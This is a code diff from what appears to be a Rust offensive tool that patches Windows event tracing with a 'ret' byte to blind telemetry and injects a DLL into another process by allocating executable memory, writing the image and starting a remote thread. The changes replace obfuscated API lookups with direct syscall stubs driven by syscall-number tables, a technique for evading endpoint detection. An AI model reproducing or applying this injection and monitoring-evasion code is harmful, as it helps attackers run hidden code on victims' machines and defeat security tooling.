@@ -1,14 +1,12 @@
 use std::str::Bytes;
+use std::ffi::c_void;
 use std::thread;
 use std::time::Duration;
 use std::ptr::null_mut;
 use std::ptr::addr_of_mut;
 use anyhow::Ok;
 
-use crate::nt_api::{
-    NT_OPEN_PROCESS_ADDR, NT_ALLOCATE_VIRTUAL_MEMORY_ADDR, NT_WRITE_VIRTUAL_MEMORY_ADDR,
-    NT_CREATE_THREAD_EX_ADDR
-};
+use crate::nt_api::*;
 
 use ntapi::{
     ntobapi::NtClose,
@@ -46,43 +44,43 @@ use obfuse::obfuse;
 
 use crate::parse_pe::PeParser;
 
-type NtOpenProcessFn = unsafe extern "system" fn(
-    ProcessHandle: *mut HANDLE,
-    DesiredAccess: u32,
-    ObjectAttributes: *const (),
-    ClientId: *const (),
-) -> i32;
+// type NtOpenProcessFn = unsafe extern "system" fn(
+//     ProcessHandle: *mut HANDLE,
+//     DesiredAccess: u32,
+//     ObjectAttributes: *const (),
+//     ClientId: *const (),
+// ) -> i32;
 
-type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut *mut std::ffi::c_void,
-    ZeroBits: usize,
-    RegionSize: *mut usize,
-    AllocationType: u32,
-    Protect: u32,
-) -> i32;
+// type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
+//     ProcessHandle: HANDLE,
+//     BaseAddress: *mut *mut std::ffi::c_void,
+//     ZeroBits: usize,
+//     RegionSize: *mut usize,
+//     AllocationType: u32,
+//     Protect: u32,
+// ) -> i32;
 
-type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut std::ffi::c_void,
-    Buffer: *const std::ffi::c_void,
-    NumberOfBytesToWrite: usize,
-    NumberOfBytesWritten: *mut usize,
-) -> i32;
+// type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
+//     ProcessHandle: HANDLE,
+//     BaseAddress: *mut std::ffi::c_void,
+//     Buffer: *const std::ffi::c_void,
+//     NumberOfBytesToWrite: usize,
+//     NumberOfBytesWritten: *mut usize,
+// ) -> i32;
 
-type NtCreateThreadExFn = unsafe extern "system" fn(
-    ThreadHandle: *mut HANDLE,
-    DesiredAccess: u32,
-    ObjectAttributes: *const (),
-    ProcessHandle: HANDLE,
-    StartAddress: *mut std::ffi::c_void,
-    Parameter: *mut std::ffi::c_void,
-    CreateSuspended: i32,
-    StackZeroBits: usize,
-    SizeOfStackCommit: usize,
-    SizeOfStackReserve: usize,
-    lpBytesBuffer: *mut std::ffi::c_void,
-) -> i32;
+// type NtCreateThreadExFn = unsafe extern "system" fn(
+//     ThreadHandle: *mut HANDLE,
+//     DesiredAccess: u32,
+//     ObjectAttributes: *const (),
+//     ProcessHandle: HANDLE,
+//     StartAddress: *mut std::ffi::c_void,
+//     Parameter: *mut std::ffi::c_void,
+//     CreateSuspended: i32,
+//     StackZeroBits: usize,
+//     SizeOfStackCommit: usize,
+//     SizeOfStackReserve: usize,
+//     lpBytesBuffer: *mut std::ffi::c_void,
+// ) -> i32;
 
 
 
@@ -104,19 +102,21 @@ pub fn patch_etw() -> Result<(), anyhow::Error>
     };
 
     let ret_opcode: u8 = 0xC3; // ret
-    let size = mem::size_of_val(&ret_opcode);
+    let size = std::mem::size_of_val(&ret_opcode);
     let mut bytes_written: usize = 0;
 
     let res = unsafe {
 
-        let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(NT_WRITE_VIRTUAL_MEMORY_ADDR.get().expect("[ERROR] NT_WRITE_VIRTUAL_MEMORY_ADDR not initialized."));
+        // let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(NT_WRITE_VIRTUAL_MEMORY_ADDR.get().expect("[ERROR] NT_WRITE_VIRTUAL_MEMORY_ADDR not initialized."));
 
-        nt_write_virtual_memory(
+        zw_write_virtual_memory(
             handle,
-            nt_trace_addr as *mut std::ffi::c_void,
-            &ret_opcode as *const u8 as *const std::ffi::c_void,
+            nt_trace_addr as *mut c_void,
+            &ret_opcode as *const u8 as *mut c_void,
             size,
             &mut bytes_written as *mut usize,
+            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].ssn,
+            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].syscall_ret
         )
     };
 
@@ -230,33 +230,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo
     println!("[INFO] Found pid: {}.", pid);
 
 
-    let obfused_ntdll = obfuse!("ntdll.dll\0");
-    let ntdll_str = obfused_ntdll.as_str();
-    let ntdll = unsafe {
-        GetModuleHandleA(ntdll_str.as_ptr() as PCSTR)
-    };
     unsafe 
     {
-
-        let obfused_ntallocatevirtualmemory = obfuse!("NtAllocateVirtualMemory\0");
-        let ntallocatevirtualmemory_str = obfused_ntallocatevirtualmemory.as_str();
-
-        let ntallocatevirtualmemory_addr = GetProcAddress(ntdll, ntallocatevirtualmemory_str.as_ptr() as PCSTR);
-
-        let obfused_ntopenprocess = obfuse!("NtOpenProcess\0");
-        let ntopenprocess_str = obfused_ntopenprocess.as_str();
-
-        let ntopenprocess_addr = GetProcAddress(ntdll, ntopenprocess_str.as_ptr() as PCSTR);
-
-        let obfused_ntwritevirtualmemory = obfuse!("NtWriteVirtualMemory\0");
-        let ntwritevirtualmemory_str = obfused_ntwritevirtualmemory.as_str();
-
-        let ntwritevirtualmemory_addr = GetProcAddress(ntdll, ntwritevirtualmemory_str.as_ptr() as PCSTR);
-
-        let obfused_ntcreatethreadex = obfuse!("NtCreateThreadEx\0");
-        let ntcreatethreadex_str = obfused_ntcreatethreadex.as_str();
-
-        let ntcreatethreadex_addr = GetProcAddress(ntdll, ntcreatethreadex_str.as_ptr() as PCSTR);
 
 
         for _i in 1..=5 {
@@ -280,12 +255,13 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo
 
         let desired_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
 
-        let nt_open_process: NtOpenProcessFn = std::mem::transmute(ntopenprocess_addr);
-        let status = nt_open_process(
-            &mut process_handle,
-            desired_access,
-            &object_attributes as *const OBJECT_ATTRIBUTES as *const (),
-            &client_id as *const CLIENT_ID as *const (),
+        let status = zw_open_process(
+            &mut process_handle as *mut HANDLE, 
+            desired_access, 
+            &object_attributes as *const OBJECT_ATTRIBUTES as *mut OBJECT_ATTRIBUTES, 
+            &client_id as *const CLIENT_ID as *mut CLIENT_ID, 
+            NT_SSN[NtIndex::ZwOpenProcess as usize].ssn, 
+            NT_SSN[NtIndex::ZwOpenProcess as usize].syscall_ret
         );
 
         if status != STATUS_SUCCESS {
@@ -293,18 +269,20 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo
         }
 
         let dll_data = &rf_dll.data;
-        let mut base_address: PVOID = null_mut();
+        let base_address: *mut c_void  = null_mut();
         let mut region_size: SIZE_T = dll_data.len() as SIZE_T;
 
-        let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn = std::mem::transmute(ntallocatevirtualmemory_addr);
-        let status = nt_allocate_virtual_memory(
-            process_handle,
-            addr_of_mut!(base_address) as *mut *mut std::ffi::c_void,
-            0,
-            &mut region_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        ); 
+
+        let status = zw_allocate_virtual_memory(process_handle, 
+            &base_address as *const *mut c_void as *mut *mut c_void, 
+            0, 
+            &mut region_size as *const usize as *mut usize, 
+            (MEM_COMMIT | MEM_RESERVE) as u64, 
+            PAGE_EXECUTE_READWRITE as u64, 
+            NT_SSN[NtIndex::ZwAllocateVirtualMemory as usize].ssn, 
+            NT_SSN[NtIndex::ZwAllocateVirtualMemory as usize].syscall_ret
+        );
+
 
         if status != STATUS_SUCCESS || base_address.is_null() {
             NtClose(process_handle);
@@ -316,13 +294,23 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo
 
         let mut bytes_written: SIZE_T = 0;
 
-        let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(ntwritevirtualmemory_addr);
-        let status = nt_write_virtual_memory(
-            process_handle,
-            base_address as *mut std::ffi::c_void,
-            dll_data.as_ptr() as *const std::ffi::c_void,
-            dll_data.len() as usize,
-            &mut bytes_written,
+        // let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(ntwritevirtualmemory_addr);
+        // let status = nt_write_virtual_memory(
+        //     process_handle,
+        //     base_address as *mut std::ffi::c_void,
+        //     dll_data.as_ptr() as *const std::ffi::c_void,
+        //     dll_data.len() as usize,
+        //     &mut bytes_written,
+        // );
+
+        let status = zw_write_virtual_memory(
+            process_handle, 
+            base_address as *mut c_void, 
+            dll_data.as_ptr() as *const c_void as *mut c_void, 
+            dll_data.len() as usize, 
+            &mut bytes_written, 
+            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].ssn, 
+            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].syscall_ret
         );
 
         if status != STATUS_SUCCESS || bytes_written != dll_data.len() {
@@ -333,20 +321,24 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo
         let mut thread_handle: HANDLE = null_mut();
         let start_address = (base_address as usize + yolo) as *mut std::ffi::c_void;
 
-        let nt_create_thread_ex: NtCreateThreadExFn = std::mem::transmute(ntcreatethreadex_addr);
-        let status = nt_create_thread_ex(
-            &mut thread_handle,
-            THREAD_ALL_ACCESS,
-            null_mut(),
-            process_handle,
-            start_address,
-            null_mut(),
-            0,
-            0,
-            0,
-            0,
-            null_mut(),
+        let status = zw_create_thread_ex(
+            &mut thread_handle as *mut HANDLE, 
+            THREAD_ALL_ACCESS, 
+            null_mut(), 
+            process_handle, 
+            start_address, 
+            null_mut(), 
+            0, 
+            0, 
+            0, 
+            0, 
+            null_mut(), 
+            NT_SSN[NtIndex::ZwCreateThreadEx as usize].ssn, 
+            NT_SSN[NtIndex::ZwCreateThreadEx as usize].syscall_ret
         );
+
+
+
 
         if status != STATUS_SUCCESS {
             NtClose(process_handle);
